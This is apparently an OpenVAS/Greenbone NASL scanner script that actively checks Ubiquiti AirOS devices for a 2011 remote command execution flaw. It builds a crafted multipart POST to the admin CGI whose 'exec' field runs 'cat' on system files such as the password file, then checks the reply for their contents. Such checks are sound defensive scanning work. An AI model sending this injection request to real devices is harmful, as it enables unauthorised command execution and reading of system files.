# SPDX-FileCopyrightText: 2011 Greenbone AG
# Some text descriptions might be excerpted from (a) referenced
# source(s), and are Copyright (C) by the respective right holder(s).
#
# SPDX-License-Identifier: GPL-2.0-only

if(description)
{
  script_oid("1.3.6.1.4.1.25623.1.0.103371");
  script_version("2025-09-12T05:38:45+0000");
  script_tag(name:"last_modification", value:"2025-09-12 05:38:45 +0000 (Fri, 12 Sep 2025)");
  script_tag(name:"creation_date", value:"2011-12-22 15:05:11 +0100 (Thu, 22 Dec 2011)");
  script_tag(name:"cvss_base", value:"9.3");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:M/Au:N/C:C/I:C/A:C");

  script_tag(name:"qod_type", value:"remote_vul");

  script_tag(name:"solution_type", value:"VendorFix");

  script_name("Ubiquiti Networks AirOS RCE Vulnerability (Dec 2011) - Active Check");

  script_category(ACT_ATTACK);

  script_copyright("Copyright (C) 2011 Greenbone AG");
  script_family("Web application abuses");
  script_dependencies("find_service.nasl", "httpver.nasl",
                      "os_detection.nasl", "global_settings.nasl");
  script_require_ports("Services/www", 80);
  script_require_keys("Host/runs_unixoide");
  script_exclude_keys("Settings/disable_cgi_scanning");

  script_tag(name:"summary", value:"AirOS is prone to a vulnerability that let attackers execute
  arbitrary commands in the context of the application. This issue occurs because the application
  fails to adequately sanitize user-supplied input.");

  script_tag(name:"vuldetect", value:"Sends a crafted HTTP POST request and checks the response.");

  script_tag(name:"impact", value:"Successful attacks can compromise the affected application and
  possibly the underlying device.");

  script_tag(name:"solution", value:"Updates are available. Please see the references for more
  details.");

  script_xref(name:"URL", value:"https://web.archive.org/web/20210121043240/http://www.securityfocus.com/bid/51178");
  script_xref(name:"URL", value:"https://seclists.org/fulldisclosure/2011/Dec/419");
  script_xref(name:"URL", value:"https://gregsowell.com/?p=3428");
  # nb: This is a dead link and no archive.org one is available but still kept for tracking /
  # archival purposes.
  script_xref(name:"URL", value:"http://ubnt.com/forum/showthread.php?p=236875");

  exit(0);
}

include("host_details.inc");
include("http_func.inc");
include("http_keepalive.inc");
include("traversal_func.inc");
include("os_func.inc");
include("port_service_func.inc");

port = http_get_port(default: 80);

traversal_files = traversal_files("linux");

check_files = make_list("/admin.cgi/sd.css", "/adm.cgi/sd.css");

host = http_host_name(port: port);

foreach check_file (check_files) {

  url = check_file;

  req = http_get(item: url, port: port);
  buf = http_keepalive_send_recv(port: port, data: req, bodyonly: FALSE);
  if (!buf)
    continue;

  if ("<title>Device administration utility" >< buf) {

    foreach pattern (keys(traversal_files)) {

      traversal_file = traversal_files[pattern];

      req = string(
                    "POST ", check_file, " HTTP/1.1\r\n",
                    "Host: ", host, "\r\n",
                    "Accept-Encoding: gzip, deflate\r\n",
                    "Referer: http://", host, "/admin.cgi/sd.css\r\n",
                    "Cookie: AIROS_SESSIONID=a447a1b693b321f598389d6972ab5c18; ui_language=pt_PT\r\n",
                    "Content-Type: multipart/form-data; boundary=---------------------------15531490717347903902081461200\r\n",
                    "Content-Length: 300\r\n",
                    "\r\n",
                    "-----------------------------15531490717347903902081461200\r\n",
                    'Content-Disposition: form-data; name="exec"',"\r\n",
                    "\r\n",
                    "cat /" + traversal_file + "\r\n",
                    "-----------------------------15531490717347903902081461200\r\n",
                    'Content-Disposition: form-data; name="action"',"\r\n",
                    "\r\n",
                    "cli\r\n",
                    "-----------------------------15531490717347903902081461200--\r\n\r\n");
      res = http_keepalive_send_recv(port: port, data: req, bodyonly: FALSE);

      if (egrep(string: res, pattern: pattern, icase: TRUE)) {
        report = http_report_vuln_url(port: port, url: check_file);
        security_message(port: port, data: report);
        exit(0);
      }
    }
  }
}

exit(99);
